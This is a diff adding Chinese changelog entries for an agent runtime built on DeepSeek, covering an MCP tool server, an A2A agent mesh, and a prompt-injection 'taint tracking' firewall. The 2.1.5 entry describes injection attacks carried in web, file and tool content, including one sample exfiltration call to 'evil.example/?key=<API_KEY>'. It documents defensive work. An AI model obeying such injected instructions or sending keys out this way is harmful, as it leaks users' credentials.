@@ -2,6 +2,54 @@
 
 本项目使用类似 [Keep a Changelog](https://keepachangelog.com/zh-CN/1.1.0/) 的分组方式维护变更记录。未发布内容记录在 `[Unreleased]`，正式发版时迁移到具体版本。
 
+## [2.1.5]
+
+### 新增
+
+- **Context Taint Tracking + Prompt Injection Firewall（上下文污染追踪与注入防火墙）**：运行时的 prompt 混合了信任级别完全不同的来源（用户输入 vs 网页 / 文件 / 工具结果），本版开始逐字节追踪「哪些内容来自哪里」并形成检测 → 隔离 → 拦截的闭环：
+  - **分段打标（taint tracking）**：新增 `deepseek_infra/infra/gateway/context_taint.py`，把组装后的请求按来源分段——`trusted_system` / `trusted_user` / `trusted_memory` / `trusted_tool` 可信，`untrusted_web`（搜索上下文与 web 工具结果）/ `untrusted_file`（上传文件与文件读取工具结果）/ `untrusted_tool_result` 不可信（按消息角色、文件 / 搜索 / 记忆标记与工具结果里的 `"tool":"<name>"` 归类）。
+  - **三类指令扫描**：对不可信段扫描 prompt 注入（复用 Tool Policy 的中英注入 pattern）、**密钥外泄指令**（要求把 API Key / token 发送出去）与**工具调用指令**（资料里命令模型调用 `forget_memory` / `fetch_url` 等敏感工具）；汇总成 `diagnostics.contextTaint` 报告（来源字符分布、各类命中数、整轮 `tainted` 判定）。
+  - **隔离加固（cache 友好）**：联网搜索上下文经 `harden_search_context` 前置「防注入隔离」声明并红action明确注入行（per-turn 动态块，零 cache 影响）；文件上下文块在头部插入一行确定性 guard（同一会话每轮字节相同，prompt cache 前缀跨轮保持稳定）。`TAINT_HARDEN_*` 可关。
+  - **凭证外泄硬拦截**：`ToolPolicy` 新增 `secrets` 与 `arguments_contain_secret`——运行时自身凭证（请求 / 服务端的 DeepSeek / Tavily Key、本地 auth token）出现在任何工具调用参数里（如 `fetch_url` 到 `evil.example/?key=<API_KEY>`）一律 `secret_exfiltration_blocked` 拒绝（critical），无条件生效。
+  - **污染轮升级确认（taint escalation）**：本轮上下文检出注入指令、或中途工具结果被清洗出注入文本（`sanitize_result` 自动置位 `tainted`）后，高风险 / 敏感写入工具（`fetch_url` / `forget_memory` / `suggest_memory` / `create_reminder`）转为 `needs_confirmation`（`taint_escalated_confirmation`），`approvedTools` 预批可放行；`TAINT_ESCALATE_CONFIRM=0` 可关。
+- **配置 / 端点 / 诊断**：新增 `ContextTaintSettings` 与 `TAINT_ENABLED` / `TAINT_HARDEN_SEARCH_CONTEXT` / `TAINT_HARDEN_FILE_CONTEXT` / `TAINT_ESCALATE_CONFIRM` / `TAINT_MAX_SEGMENTS`（全部默认开）。新增 `GET /api/taint`，`/api/config` 增补 `contextTaint`；`diagnostics.toolPolicy` 增补 `tainted` / `secretBlocks`。
+
+### 测试
+
+- 新增 `tests/test_context_taint.py`（13 项）：三类指令扫描（中英）、用户消息按文件标记拆段、per-turn 系统消息按搜索标记拆段、工具结果按工具名归类信任、报告聚合与禁用短路、搜索上下文加固（包装 + 红action + 可关）、附件上下文 guard 行（含可关）、凭证外泄拒绝（含长度下限）、污染轮升级确认（低风险放行 / 预批放行 / 默认不升级）、工具结果清洗中途置污、`build_deepseek_request` 透出 `contextTaint`、`build_tool_policy` 装配 secrets 与污染判定、状态结构。
+
+## [2.1.4]
+
+### 新增
+
+- **A2A-style Agent Mesh（Agent 互操作）**：MCP 解决 Agent↔Tool，A2A 解决 Agent↔Agent。本地每个 Seek/Agent 角色现在是一个可被外部 Agent 发现并委派任务的 A2A Agent：
+  - **Agent Card 发现**：新增 `deepseek_infra/infra/agent_runtime/a2a.py`，orchestrator / researcher / coder / reasoner / critic 各有一张 Agent Card（`protocolVersion` 0.3.0、`url`、streaming 能力、按 capability 切片的 skills tags）；`GET /.well-known/agent-card.json`（标准发现路径，仅元数据、不鉴权）与 `GET /a2a/agents`（全部 Card）。
+  - **任务生命周期（JSON-RPC 2.0）**：`POST /a2a` 与 `POST /a2a/agents/{agentId}` 支持 `message/send`（提交即返回 Task，后台执行）、`message/stream`（SSE 推送 Task 快照 → `status-update` / `artifact-update`，终态 `final:true`）、`tasks/get`（可带 `historyLength`）、`tasks/cancel`（尽力而为：在途上游调用完成后丢弃结果）与 `tasks/list`；状态机 `submitted → working → completed | failed | canceled`，A2A 错误码 `-32001`（任务不存在）/ `-32002`（不可取消）。
+  - **能力隔离执行**：任务经 `call_deepseek` 在该角色的 capability 切片与系统画像内执行（researcher 可联网、coder 只有本地代码工具、reasoner / critic 纯推理），外部 Agent 永远拿不到超出该角色的工具面；执行需要服务端 `DEEPSEEK_API_KEY`，缺失时任务以 `failed` 干净终态返回。
+  - **持久化与重启对账**：任务快照（不含凭证）写入 `.a2a/`，重启后磁盘上残留的非终态任务读取时标记 `failed`；内存 store 超过 `A2A_MAX_TASKS` 时淘汰最老的终态任务。
+  - **跨 Agent 委派**：`A2AClient`（JSON-RPC over HTTP）对外部 A2A Agent 做 `send_message` / `get_task` / `cancel_task`，`A2A_PEERS` 配置委派目标。
+- **配置 / 端点**：新增 `A2ASettings` 与 `A2A_ENABLED`（默认开）/ `A2A_DEFAULT_AGENT` / `A2A_MAX_TASKS` / `A2A_HISTORY_LIMIT` / `A2A_PEERS`；`/api/config` 增补 `a2a` 状态块（agents、tasksByState、peers）。`.gitignore` 排除 `.a2a/`。
+
+### 测试
+
+- 新增 `tests/test_a2a.py`（11 项）：Agent Card 覆盖全角色（skills tags / streaming / 未知角色拒绝）、message/send 后台执行到 completed（artifact / history / capability 切片载荷 / `.a2a` 落盘）、空消息拒绝、historyLength 截断、运行中取消且 worker 不覆盖终态 + 二次取消 `-32002`、任务不存在 `-32001` 与未知方法 `-32601`、上游失败置 failed、重启对账磁盘任务、message/stream 事件序列（Task → artifact-update → final status-update）、A2AClient 回环委派（含终态取消报错）、状态结构。
+
+## [2.1.3]
+
+### 新增
+
+- **MCP-native Tool Hub（标准协议工具中枢）**：本地工具不再只是 DeepSeek Infra 的内部工具——新增 `deepseek_infra/infra/mcp/` 把整个 Tool Calling Runtime 封装成 MCP（Model Context Protocol）server，Claude Desktop、Cursor 等任意 MCP 客户端可直接复用：
+  - **JSON-RPC 2.0 协议层**：`server.py` 实现 Streamable-HTTP 风格的单端点交换（`POST /mcp`，本地 token 鉴权；通知返回 202 空体），方法覆盖 `initialize`（协议版本 `2025-06-18`）/ `notifications/initialized` / `ping` / `tools/list` / `tools/call` / `resources/list|read` / `prompts/list|get`，错误码遵循 JSON-RPC（-32700/-32600/-32601/-32602/-32603）。
+  - **Tools 目录**：`registry.py` 把 `available_tool_definitions()` 的 17 个工具映射成 MCP tools——`inputSchema` 直通声明的 JSON schema，`annotations`（readOnly / destructive / openWorld）取自 Tool Policy risk card；目录按 `MCP_CAPABILITY` 能力画像切片。
+  - **Resources / Prompts**：生成产物以 `generated://<fileId>` 暴露（svg 文本、pptx/docx/pdf base64 blob），`runtime://capabilities` 暴露工具策略文档；内置 `slides-outline` / `research-brief` 两个参数化 prompt 模板。
+  - **权限与同意**：`permissions.py` + `adapters.py` 让每个 `tools/call` 都走既有 Tool Policy 闸门（capability 白名单、schema 校验、SSRF / 路径 / 敏感写入防护、结果注入清洗、审计），策略拒绝与工具失败以 `isError` 工具级错误返回；需确认的工具可经 `params._meta.approvedTools` 预批。配置了 Tavily Key 时 `web_search` 在 MCP 调用里真实可用。
+  - **出方向 MCP client**：`client.py` 提供最小 Streamable-HTTP 客户端（`initialize` / `tools/list` / `tools/call`、`Mcp-Session-Id` 会话头），默认关闭，仅连接 `MCP_CLIENT_SERVERS` 显式配置的外部 MCP server，让本地 Agent 也能消费外部工具目录。
+- **配置 / 端点**：新增 `MCPSettings` 与 `MCP_ENABLED`（默认开）/ `MCP_CAPABILITY` / `MCP_EXPOSE_RESOURCES` / `MCP_EXPOSE_PROMPTS` / `MCP_CLIENT_ENABLED`（默认关）/ `MCP_CLIENT_SERVERS`（JSON）/ `MCP_CLIENT_TIMEOUT_SECONDS`；新增 `GET /api/mcp`，`/api/config` 增补 `mcp` 状态块。
+
+### 测试
+
+- 新增 `tests/test_mcp.py`（11 项）：initialize 握手（协议版本 / capabilities / 通知无响应体）、tools/list 17 工具带 schema 与注解、能力切片收窄目录且越权调用被拒、tools/call 真实执行本地工具（content + structuredContent）、策略安全闸门保留（SSRF / 未知工具）、JSON-RPC 错误码族、resources 列表与读取（生成 svg / runtime 文档 / 不存在资源）、prompts 列表与渲染、状态结构、MCPClient 对本机 server 的回环 initialize/list/call（含会话头）、client 错误翻译（RPC 错误与不可达均抛 `AppError`）。
+
 ## [2.1.2]
 
 ### 新增
